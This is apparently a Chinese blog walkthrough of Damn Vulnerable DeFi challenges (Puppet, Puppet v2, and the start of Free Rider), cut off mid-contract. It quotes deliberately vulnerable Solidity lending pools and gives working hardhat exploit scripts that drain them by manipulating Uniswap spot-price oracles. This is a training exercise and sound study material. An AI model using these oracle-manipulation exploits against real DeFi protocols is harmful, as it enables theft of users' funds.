&#125;);</span><br></pre></td></tr></table></figure>
<p>首先通过hardhat解锁账户地址，我们就可以使用这两个账户来进行调用，然后先将价格修改为最低价，再买入，修改为最高价后卖出，再将价格修改回去，即可完成攻击。<br><img src="https://img-blog.csdnimg.cn/3b9c1edef5b54dc0a234624cea7b3410.png" alt="在这里插入图片描述"><br>执行脚本，攻击完成。</p>
<h1 id="Puppet"><a href="#Puppet" class="headerlink" title="Puppet"></a>Puppet</h1><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>题目要求</p>
<blockquote>
<p>There’s a huge lending pool borrowing Damn Valuable Tokens (DVTs),<br>where you first need to deposit twice the borrow amount in ETH as<br>collateral. The pool currently has 100000 DVTs in liquidity.</p>
<p>There’s a DVT market opened in an Uniswap v1 exchange, currently with<br>10 ETH and 10 DVT in liquidity.</p>
<p>Starting with 25 ETH and 1000 DVTs in balance, you must steal all<br>tokens from the lending pool.</p>
</blockquote>
<p>大意是有一个借贷池在借贷DVT，池中有十万DYT，且存在一个交易市场，现有10ETH和10DVT的流动性，我们需要以25ETH和1000DVT的余额拿走借贷池中的所有代币。<br>借贷池合约：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/utils/Address.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;../DamnValuableToken.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">PuppetPool</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">PuppetPool</span> is <span class="title class_">ReentrancyGuard</span> &#123;</span><br><span class="line"></span><br><span class="line">    using <span class="title class_">Address</span> <span class="keyword">for</span> address payable;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public deposits;</span><br><span class="line">    address public immutable uniswapPair;</span><br><span class="line">    <span class="title class_">DamnValuableToken</span> public immutable token;</span><br><span class="line">    </span><br><span class="line">    event <span class="title class_">Borrowed</span>(address indexed account, uint256 depositRequired, uint256 borrowAmount);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span> (address tokenAddress, address uniswapPairAddress) &#123;</span><br><span class="line">        token = <span class="title class_">DamnValuableToken</span>(tokenAddress);</span><br><span class="line">        uniswapPair = uniswapPairAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allows borrowing `borrowAmount` of tokens by first depositing two times their value in ETH</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">borrow</span>(<span class="params">uint256 borrowAmount</span>) public payable nonReentrant &#123;</span><br><span class="line">        uint256 depositRequired = <span class="title function_">calculateDepositRequired</span>(borrowAmount);</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> &gt;= depositRequired, <span class="string">&quot;Not depositing enough collateral&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (msg.<span class="property">value</span> &gt; depositRequired) &#123;</span><br><span class="line">            <span class="title function_">payable</span>(msg.<span class="property">sender</span>).<span class="title function_">sendValue</span>(msg.<span class="property">value</span> - depositRequired);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        deposits[msg.<span class="property">sender</span>] = deposits[msg.<span class="property">sender</span>] + depositRequired;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Fails if the pool doesn&#x27;t have enough tokens in liquidity</span></span><br><span class="line">        <span class="built_in">require</span>(token.<span class="title function_">transfer</span>(msg.<span class="property">sender</span>, borrowAmount), <span class="string">&quot;Transfer failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">        emit <span class="title class_">Borrowed</span>(msg.<span class="property">sender</span>, depositRequired, borrowAmount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">calculateDepositRequired</span>(<span class="params">uint256 amount</span>) public view returns (uint256) &#123;</span><br><span class="line">        <span class="keyword">return</span> amount * <span class="title function_">_computeOraclePrice</span>() * <span class="number">2</span> / <span class="number">10</span> ** <span class="number">18</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_computeOraclePrice</span>(<span class="params"></span>) private view returns (uint256) &#123;</span><br><span class="line">        <span class="comment">// calculates the price of the token in wei according to Uniswap pair</span></span><br><span class="line">        <span class="keyword">return</span> uniswapPair.<span class="property">balance</span> * (<span class="number">10</span> ** <span class="number">18</span>) / token.<span class="title function_">balanceOf</span>(uniswapPair);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">     ... functions to deposit, redeem, repay, calculate interest, and so on ...</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>借贷池提供两个函数，一个用来借钱，另一个用来计算借钱时需要支付的eth。<br>本题只提供了这一个合约，我们可以注意到在calculatedDepositRequired函数中，是根据流通池中现有的eth和token的比例来计算应支付的eth。</p>
<p>这里在计算时因为乘了10**18所以会存在一个溢出，但需要大量的eth,很明显我们没有那么多。所以我们只能从token与eth的比例入手。<br>因为使用了uniswapExchangev1合约，并在项目中提供了字节码，所以我们能够找到合约源码。<br><img src="https://img-blog.csdnimg.cn/35cf686ff23347e4998dce524e8d72a0.png" alt="在这里插入图片描述"><br>我们利用这个函数将自己的token与uniswap的ETH进行互换，token变得很大，eth变得很小，比例就变得很小了，我们就可以用现有的eth换出借贷池中所有的token。</p>
<h2 id="攻击-2"><a href="#攻击-2" class="headerlink" title="攻击"></a>攻击</h2><p>js攻击代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;Exploit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">/** CODE YOUR EXPLOIT HERE */</span></span><br><span class="line">        <span class="comment">//将手中的token与uniswap交换ETH</span></span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">token</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">approve</span>(<span class="variable language_">this</span>.<span class="property">uniswapExchange</span>.<span class="property">address</span>,<span class="variable constant_">ATTACKER_INITIAL_TOKEN_BALANCE</span>)</span><br><span class="line">        <span class="comment">// const ethPayout = await this.uniswapExchange.connect(attacker).getTokenToEthInputPrice(ATTACKER_INITIAL_TOKEN_BALANCE,&#123;gasLimit:1e6&#125;)</span></span><br><span class="line">        <span class="comment">// console.log(ethers.utils.formatEther(ethPayout))</span></span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">uniswapExchange</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">tokenToEthSwapInput</span>(</span><br><span class="line">            ethers.<span class="property">utils</span>.<span class="title function_">parseEther</span>(<span class="string">&#x27;999&#x27;</span>), </span><br><span class="line">            ethers.<span class="property">utils</span>.<span class="title function_">parseEther</span>(<span class="string">&quot;9&quot;</span>), </span><br><span class="line">            (<span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getBlock</span>(<span class="string">&#x27;latest&#x27;</span>)).<span class="property">timestamp</span> * <span class="number">2</span>, </span><br><span class="line">        )</span><br><span class="line">        <span class="comment">//计算将token全部换走需要的eth</span></span><br><span class="line">        depositNeed = <span class="variable language_">this</span>.<span class="property">lendingPool</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">calculateDepositRequired</span>(<span class="variable constant_">POOL_INITIAL_TOKEN_BALANCE</span>)</span><br><span class="line">        <span class="comment">//交换token</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">lendingPool</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">borrow</span>(<span class="variable constant_">POOL_INITIAL_TOKEN_BALANCE</span>,&#123;<span class="attr">value</span>:depositNeed&#125;)</span><br></pre></td></tr></table></figure>
<p>首先将自己手中的token与uniswap交换eth，然后计算将借贷池中全部token转走需要的eth，最后将Pool中的token全部借走。<br><img src="https://img-blog.csdnimg.cn/f4cdf736f39e4a0398935da276ca463a.png" alt="在这里插入图片描述"><br>执行脚本，完成攻击。</p>
<h1 id="Puppet-v2"><a href="#Puppet-v2" class="headerlink" title="Puppet v2"></a>Puppet v2</h1><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>题目要求：</p>
<blockquote>
<p>The developers of the last lending pool are saying that they’ve<br>learned the lesson. And just released a new version!</p>
<p>Now they’re using a Uniswap v2 exchange as a price oracle, along with<br>the recommended utility libraries. That should be enough.</p>
<p>You start with 20 ETH and 10000 DVT tokens in balance. The new lending<br>pool has a million DVT tokens in balance. You know what to do ;)</p>
</blockquote>
<p>大意是他们吸取了上个题的教训，这次采用了uniswapv2，我们有20ETH和10000DVT代币，需要我们讲借贷池中的100万DVT代币全部拿走。<br>借贷池合约：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@uniswap/v2-periphery/contracts/libraries/SafeMath.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">IERC20</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address to, uint256 amount</span>) external returns (bool);</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transferFrom</span>(<span class="params">address <span class="keyword">from</span>, address to, uint256 amount</span>) external returns (bool);</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address account</span>) external returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">PuppetV2Pool</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">PuppetV2Pool</span> &#123;</span><br><span class="line">    using <span class="title class_">SafeMath</span> <span class="keyword">for</span> uint256;</span><br><span class="line"></span><br><span class="line">    address private _uniswapPair;</span><br><span class="line">    address private _uniswapFactory;</span><br><span class="line">    <span class="title class_">IERC20</span> private _token;</span><br><span class="line">    <span class="title class_">IERC20</span> private _weth;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public deposits;</span><br><span class="line">        </span><br><span class="line">    event <span class="title class_">Borrowed</span>(address indexed borrower, uint256 depositRequired, uint256 borrowAmount, uint256 timestamp);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span> (</span><br><span class="line">        address wethAddress,</span><br><span class="line">        address tokenAddress,</span><br><span class="line">        address uniswapPairAddress,</span><br><span class="line">        address uniswapFactoryAddress</span><br><span class="line">    ) public &#123;</span><br><span class="line">        _weth = <span class="title class_">IERC20</span>(wethAddress);</span><br><span class="line">        _token = <span class="title class_">IERC20</span>(tokenAddress);</span><br><span class="line">        _uniswapPair = uniswapPairAddress;</span><br><span class="line">        _uniswapFactory = uniswapFactoryAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@notice</span> Allows borrowing `borrowAmount` of tokens by first depositing three times their value in WETH</span></span><br><span class="line"><span class="comment">     *         Sender must have approved enough WETH in advance.</span></span><br><span class="line"><span class="comment">     *         Calculations assume that WETH and borrowed token have same amount of decimals.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">borrow</span>(<span class="params">uint256 borrowAmount</span>) external &#123;</span><br><span class="line">        <span class="built_in">require</span>(_token.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)) &gt;= borrowAmount, <span class="string">&quot;Not enough token balance&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Calculate how much WETH the user must deposit</span></span><br><span class="line">        uint256 depositOfWETHRequired = <span class="title function_">calculateDepositOfWETHRequired</span>(borrowAmount);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Take the WETH</span></span><br><span class="line">        _weth.<span class="title function_">transferFrom</span>(msg.<span class="property">sender</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), depositOfWETHRequired);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// internal accounting</span></span><br><span class="line">        deposits[msg.<span class="property">sender</span>] += depositOfWETHRequired;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(_token.<span class="title function_">transfer</span>(msg.<span class="property">sender</span>, borrowAmount));</span><br><span class="line"></span><br><span class="line">        emit <span class="title class_">Borrowed</span>(msg.<span class="property">sender</span>, depositOfWETHRequired, borrowAmount, block.<span class="property">timestamp</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">calculateDepositOfWETHRequired</span>(<span class="params">uint256 tokenAmount</span>) public view returns (uint256) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">_getOracleQuote</span>(tokenAmount).<span class="title function_">mul</span>(<span class="number">3</span>) / (<span class="number">10</span> ** <span class="number">18</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Fetch the price from Uniswap v2 using the official libraries</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_getOracleQuote</span>(<span class="params">uint256 amount</span>) private view returns (uint256) &#123;</span><br><span class="line">        (uint256 reservesWETH, uint256 reservesToken) = <span class="title class_">UniswapV2Library</span>.<span class="title function_">getReserves</span>(</span><br><span class="line">            _uniswapFactory, <span class="title function_">address</span>(_weth), <span class="title function_">address</span>(_token)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">UniswapV2Library</span>.<span class="title function_">quote</span>(amount.<span class="title function_">mul</span>(<span class="number">10</span> ** <span class="number">18</span>), reservesToken, reservesWETH);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这个合约与上题差别不大，只是将eth换成了weth，也就是对eth进行了封装。所以这个题的攻击思路与上个题也是完全一样的，只不过从uniswapv1转换成了uniswapv2，所以我们与Token进行对换 的代币就从eth变成了weth。</p>
<h2 id="攻击-3"><a href="#攻击-3" class="headerlink" title="攻击"></a>攻击</h2><p>js攻击合约：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;Exploit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">/** CODE YOUR EXPLOIT HERE */</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">token</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">approve</span>(<span class="variable language_">this</span>.<span class="property">uniswapRouter</span>.<span class="property">address</span>, <span class="variable constant_">ATTACKER_INITIAL_TOKEN_BALANCE</span>);</span><br><span class="line">        <span class="comment">//将手中的token换成weth</span></span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">uniswapRouter</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">swapExactTokensForTokens</span>(</span><br><span class="line">            <span class="variable constant_">ATTACKER_INITIAL_TOKEN_BALANCE</span>, <span class="comment">// transfer exactly 10,000 tokens</span></span><br><span class="line">            ethers.<span class="property">utils</span>.<span class="title function_">parseEther</span>(<span class="string">&quot;9&quot;</span>), <span class="comment">// minimum of 9 WETH return</span></span><br><span class="line">            [<span class="variable language_">this</span>.<span class="property">token</span>.<span class="property">address</span>, <span class="variable language_">this</span>.<span class="property">weth</span>.<span class="property">address</span>], <span class="comment">// token addresses</span></span><br><span class="line">            attacker.<span class="property">address</span>,</span><br><span class="line">            (<span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getBlock</span>(<span class="string">&#x27;latest&#x27;</span>)).<span class="property">timestamp</span> * <span class="number">2</span>,   <span class="comment">// deadline</span></span><br><span class="line">        )</span><br><span class="line">        <span class="comment">//计算换出全部token需要的weth</span></span><br><span class="line">        <span class="keyword">const</span> deposit = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">lendingPool</span>.<span class="title function_">calculateDepositOfWETHRequired</span>(<span class="variable constant_">POOL_INITIAL_TOKEN_BALANCE</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">weth</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">approve</span>(<span class="variable language_">this</span>.<span class="property">lendingPool</span>.<span class="property">address</span>, deposit)</span><br><span class="line">        <span class="keyword">await</span> attacker.<span class="title function_">sendTransaction</span>(&#123;</span><br><span class="line">            <span class="attr">to</span>: <span class="variable language_">this</span>.<span class="property">weth</span>.<span class="property">address</span>,</span><br><span class="line">            <span class="attr">value</span>: ethers.<span class="property">utils</span>.<span class="title function_">parseEther</span>(<span class="string">&quot;19.9&quot;</span>)<span class="comment">//20会出现out of gas</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">lendingPool</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">borrow</span>(<span class="variable constant_">POOL_INITIAL_TOKEN_BALANCE</span>, &#123;</span><br><span class="line">            <span class="attr">gasLimit</span>: <span class="number">1e6</span></span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
<p>思路与上题几乎一样，先给uniswap权限，随后将token通过uniswap的函数转换成weth，再将我们手里的eth也转换为weth，然后token与weth的兑换率就变得很低，所以我们就可以将我们的weth发送给pool，从而将token全部取走。<br><img src="https://img-blog.csdnimg.cn/e2fc94df8c9841879d4c6ab168d35b75.png" alt="在这里插入图片描述"><br>执行脚本，攻击成功。</p>
<h1 id="Free-rider"><a href="#Free-rider" class="headerlink" title="Free rider"></a>Free rider</h1><h2 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h2><p>题目要求：</p>
<blockquote>
<p>A new marketplace of Damn Valuable NFTs has been released! There’s<br>been an initial mint of 6 NFTs, which are available for sale in the<br>marketplace. Each one at 15 ETH.</p>
<p>A buyer has shared with you a secret alpha: the marketplace is<br>vulnerable and all tokens can be taken. Yet the buyer doesn’t know how<br>to do it. So it’s offering a payout of 45 ETH for whoever is willing<br>to take the NFTs out and send them their way.</p>
<p>You want to build some rep with this buyer, so you’ve agreed with the<br>plan.</p>
<p>Sadly you only have 0.5 ETH in balance. If only there was a place<br>where you could get free ETH, at least for an instant.</p>
</blockquote>
<p>大意是，有一个发行nft的新市场发行了六个nft，每个nft价值15eth，我们只有0.5eth的余额，但我们需要拿走全部的eth并发送给买家，买家会给我们45个ETH。</p>
<p>市场合约：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/utils/Address.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;../DamnValuableNFT.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">FreeRiderNFTMarketplace</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">FreeRiderNFTMarketplace</span> is <span class="title class_">ReentrancyGuard</span> &#123;</span><br><span class="line"></span><br><span class="line">    using <span class="title class_">Address</span> <span class="keyword">for</span> address payable;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">DamnValuableNFT</span> public token;</span><br><span class="line">    uint256 public amountOfOffers;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// tokenId -&gt; price</span></span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">uint256</span> =&gt;</span> uint256) private offers;</span><br><span class="line"></span><br><span class="line">    event <span class="title class_">NFTOffered</span>(address indexed offerer, uint256 tokenId, uint256 price);</span><br><span class="line">    event <span class="title class_">NFTBought</span>(address indexed buyer, uint256 tokenId, uint256 price);</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">uint8 amountToMint</span>) payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(amountToMint &lt; <span class="number">256</span>, <span class="string">&quot;Cannot mint that many tokens&quot;</span>);</span><br><span class="line">        token = <span class="keyword">new</span> <span class="title class_">DamnValuableNFT</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(uint8 i = <span class="number">0</span>; i &lt; amountToMint; i++) &#123;</span><br><span class="line">            token.<span class="title function_">safeMint</span>(msg.<span class="property">sender</span>);</span><br><span class="line">        &#125;        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">offerMany</span>(<span class="params">uint256[] calldata tokenIds, uint256[] calldata prices</span>) external nonReentrant &#123;</span><br><span class="line">        <span class="built_in">require</span>(tokenIds.<span class="property">length</span> &gt; <span class="number">0</span> &amp;&amp; tokenIds.<span class="property">length</span> == prices.<span class="property">length</span>);</span><br><span class="line">        <span class="keyword">for</span> (uint256 i = <span class="number">0</span>; i &lt; tokenIds.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="title function_">_offerOne</span>(tokenIds[i], prices[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_offerOne</span>(<span class="params">uint256 tokenId, uint256 price</span>) private &#123;</span><br><span class="line">        <span class="built_in">require</span>(price &gt; <span class="number">0</span>, <span class="string">&quot;Price must be greater than zero&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(</span><br><span class="line">            msg.<span class="property">sender</span> == token.<span class="title function_">ownerOf</span>(tokenId),</span><br><span class="line">            <span class="string">&quot;Account offering must be the owner&quot;</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(</span><br><span class="line">            token.<span class="title function_">getApproved</span>(tokenId) == <span class="title function_">address</span>(<span class="variable language_">this</span>) ||</span><br><span class="line">            token.<span class="title function_">isApprovedForAll</span>(msg.<span class="property">sender</span>, <span class="title function_">address</span>(<span 